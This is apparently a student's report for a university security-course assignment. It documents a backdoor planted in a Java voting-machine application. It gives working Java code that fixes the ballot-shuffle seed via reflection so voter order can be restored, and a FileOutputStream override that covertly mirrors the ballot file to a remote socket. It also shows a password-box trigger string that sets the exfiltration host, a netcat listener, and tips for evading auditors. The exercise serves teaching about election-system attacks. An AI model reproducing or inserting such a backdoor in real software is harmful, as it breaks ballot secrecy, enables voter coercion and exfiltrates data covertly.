% Vote Rigging - Project 2 - NWEN405
% David Barnett (300313764)

<!--
You paymasters want you to document your work as well as provide a demonstration (you will do this to them during the break) before they are willing to hand over your airline tickets and money in untraceable bills.

You should write short report (maximum of five pages)
-->

<!--
Tennents to attack:
Confidentiality: This means that information is only being seen or used by people who are authorized to access it.
Integrity: This means that any changes to the information by an unauthorized user are impossible (or at least detected), and changes by authorized users are tracked.
Availability: This means that the information is accessible when authorized users need it.
-->

# Purpose
<!--
Which of these purposes does you backdoor implement?
 * direct vote-manipulation hack
 * attacks aimed at breaking the authentication mechanism for PINs or administrative access
 * hacks directed at defeating voter anonymity (this allow vote bribing)
 * denial-of-service that is not triggered until the last moments of the election or only discovered after the election
-->

The purpose of the backdoor is to discredit the confidentiality of the election ballot.
This is achieved by removing the voter anonymity by exporting the ballot and ensuring
the ballot order can be restored.
The result of this backdoor allows the paymasters to associate the full ballot with an individual 
based on the order that they voted.
This would allow for vote corruption by the paymaster being able to verify that 
individuals voted for a candidate or that the paymaster could then persecute 
individuals that voted against their preferred candidate.


# Trigger
<!--
Describe the conditions for enabling or activating the backdoor. Length is going to be modification-specific. For example, you may need to provide command line switches and explain what each one does.

You can assume that either your paymasters can bribe people running the machines to make small changes locally,
run programs with extra command line options or simply send one of their agents to each of the locations while pretending to be a legitimate voter.
-->

The trigger to enable the leak is when someone enters a specialised string into the administrator
password box the resulting ballot will be leaked to a given machine on the network.
By default the backdoor will ensure that the "anonymized" ballot can be de-shuffled.
The target where the ballot is sent to during writing the dump can be configured by writing a
formatted string in the administrator login box.

The only extra infrastructure the paymaster requires is that the voting machine
has a networked connection to a machine controlled by the paymaster to receive the ballot.
This needs to be configured, a corrupted voter or official could enter 
the voting booth to configure the machine to point to the network location of the 
controlled machine.


# Design & Implementation
<!--
Identify the key parts of the code base that have been changed and add a commentary.

I would expect maybe a couple of paragraphs giving an overview of code structure, indication of how many lines have been changed and a discussion of the general approach that connects the purpose of the backdoor with the changes to the code (for example, if the desired outcome is for Party Z to always have the majority votes you will would need to explain how your changes modify the results).

You should include a walkthrough of the key parts of the code with differences from the original and modified code highlighted. 

-->

<!-- structure -->

The structure of the backdoor has three components, poisoning the ballot box shuffle, mirroring writes to
disk to a network socket and being able to configure the socket's target.
Though the main part of this backdoor is to send the ballot to an remote machine it can still work
with obtaining the ballot files. This is because both the ballots sent and saved have the same ordering.
Therefore if a machine was not setup to send the ballot to a remote machine if the paymaster can
retrieve the files the order can be reconstructed.


## Poisoning ballot shuffle

To enable the ballot to be reordered after collected the ballot the randomness of the
shuffle is poisoned.
The code below shows setting the random number generator to a known seed.
This is achieved in three steps:

1. Internally the random number generator is a shared resource and is lazily initialized on the first use of it,
   to force the creation of it a shuffle on an empty list is made.
2. Via reflection the shared random number generator is retrieved from the Collections class
3. The random number generator has its seed reset to the predefined seed

```java
static {
    Collections.shuffle(Collections.EMPTY_LIST);
    try {
        Field f = Collections.class.getDeclaredField("r");
        f.setAccessible(true);
        Random r = (Random) f.get(null);
        r.setSeed(1840);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

After this point given that only one collection is shuffled, the ballot, the initial
order can be reconstructed from the output.

### How to re-order

To re-order the ballot from the shuffled state to the original voting order a
mapping from the shuffled state to the original needs to be created.
The below code example shows how this mapping can be created:

```java
List list = new ArrayList();
// Initialize it with numbers 0 to total number of known votes -1
for (int i = 0; i < VoteCount; i++) {
    list.add(i)
}
//Shuffle the list, same shuffle as the ballot shuffle
Collections.shuffle(list, new Random(1840)) // uses the shared seed
// Now list[i] maps to its original position in the list
// where i is the "anonymized" ballot number
```

From the list the index now relates to the anonymized ballot number
and the value at the index is its position in the original list.

## Mirroring write to a socket

To enable the ballot to be mirrored an anonymous extension is made to `java.io.FileOutputStream`.
This extension also lazily initializes a shared socket to the configured target machine.
The successful initialization of the socket depends on the fact that the target machine to send
the data has been configured, see Configuring the leak target.
The mirroring is enabled by overriding the core `write` method of the original `FileOutputStream`,
`void write(byte[] data, int offset, int length)`, which all other `write` methods eventually depend on.
During a `write` the data is also written to the socket and any errors that occur with the socket
are muffled to avoid detection.
This also includes the null-pointer exceptions that will occur when the target machine is not configured.
To keep context of what the `FileOutputStream` is leaking about the file name that is being written to
is leaked after creating the print stream.


```java
static Socket leaker = null;

...

// part of BallotControl.endElection()
p = new PrintStream(new FileOutputStream(outfile) {
    {
        if (leaker == null) {
            try { leaker = new Socket(target, 1840); } catch (Exception e) { }
        }
    }

    @Override
    public void write(byte[] b, int off, int len) throws IOException {
        try { leaker.getOutputStream().write(b, off, len); } catch (Exception e) {}
        super.write(b, off, len);
    }

});
try { leaker.getOutputStream().write( (outfile.getName() + "\n").getBytes()); } catch (Exception e) { }
}
```

This feature enables the ballot to be covertly extracted from the machine to the target networked
address. When composed with the ballot shuffle poison the anonymity of the ballot is lost.
The current implementation could be improved by encrypting the traffic or obscuring it as normal
web traffic to decrease the chance of detection by network sniffers or inspection.

## Configuring the leak target

As an additional feature the target machine to receive the leak can be configured on the day in the booth.
This is achieved by leveraging the free text field on the administrator panel available to any voter.
The trigger to this feature is that if the input string is surrounded by `2:` and `:2` the middle of
the string will be used for the network address of the leaker.
The use of specific text mitigates the chance of a random citizen from accidentally using this feature.
Another safeguard is the string on both side to prevent an incomplete location to be set, 
such as when deleting the string from the input box.
For example if the string is `2:hack.my.vote.me:2` the leaker will then send the results to `hack.my.vote.me`,
the DNS request is resolved by Java or the operating system. Of course the string could also be an explicit IP address
as well to avoid DNS resolutions that could potentially reveal the backdoor.

```java
public void checkPasswd() {

    String password = new String(passwdField.getPassword());
    if (password.startsWith("2:") && password.endsWith(":2")) {
        BallotControl.target = password.substring(2, password.length() - 2);
    }
    buttonsVisibility(password.equals(adminPasswd));
}

...


static String target = "localhost";
```

Since the socket is only initialized once at the end of the election this setting 
can be updated multiple times before the configuration is committed to use.


# Self-Assessment
<!--
Briefly self-assess how well the backdoor is hidden (in terms of design and implementation) from the voter using the system and from a potential auditor.

Briefly self-assess whether your implementation is one based upon the article about Hack-a-Vote or somehow extends it and/or goes beyond what was described.

HINT. Consider the whole system when hiding your hack.
-->

## How hidden is the hack

In terms of operation of the voting machine the backdoor is transparent to the voter,
but for the implementation of it there are parts that are obvious to an auditor.
The flow of the process to vote is completely unchanged and unaffected for a regular
voter, thus their chance to detect the backdoor are nil.

Auditing the voting machine from only operation is difficult.
As without knowledge of configuring the leak target the biggest hallmark of the backdoor
is not revealed, a socket connection to the target machine, and the poisoning of
the ballot shuffle is hard to notice.
The use of the `-randomtest` flag on the `BallotControll` will not immediately reveal that
the ballot order can be restored as each test ran generates a new election every time.
This prevents an auditor to notice that if the same election was ran twice they would
expect the ballot orders to differ but in fact they will be the same thus revealing the backdoor.
A method to enable this detection would to have an optional seed to be provided for the `-randomtest`
option to allow running the same test election twice.

The backdoor is vulnerable to the auditing of the compiled output.
By inspecting the packaged JAR or the class path of the voting application 
the existence of additional anonymous classes could raise suspicion.
This has been minimized by ensuring that any new classes added are anonymous classes
instead of being a named class.
For example, previously the implementation of the mirroring component used a private class
to override `java.io.FileOutputSteam` but resulted in the file `BallotControll$FileOutputStream.class`
to be included in the built application.
To mitigate this the class was turned into an anonymous class to make the backdoor harder to
detect at the cost of making it easier for code review to find it.

The auditing of the source code will reveal the backdoor quickly.
This is due to the use of anonymous classes as an attempt to conceal 
the additional code.
In Java the use of anonymous classes are verbose and easily recognisable that something
bad is going on.
Another hallmark of suspicious code is the clear usage of reflection in static code
blocks, which either of these features alone are uncommon outside of frameworks, even more so
together.
Hiding these code additions could of been improved with the use of hiding values in unorthodox places, such as
allocated but unused space in lists to hold objects via reflection.



## Basis of backdoor on Hack-a-Vote article

The basis of this hack is the combination of two hacks discussed in the article.
The first was the ability to re-construct the original order by knowing the seed of
the random generator, this inspired the Ballot Shuffle Poisoning component of the backdoor.
The other was the ability to move out the ballot from the voting machine to an external 
machine.
This was implemented with sockets, other methods I have seen discussed are using text 
hosting services such as PasteBin to upload the text to via HTTP.
I opted for the simplicity of a simple socket so that I can test the backdoor 
with a simple netcat command, `ncat -l -p 1840`.
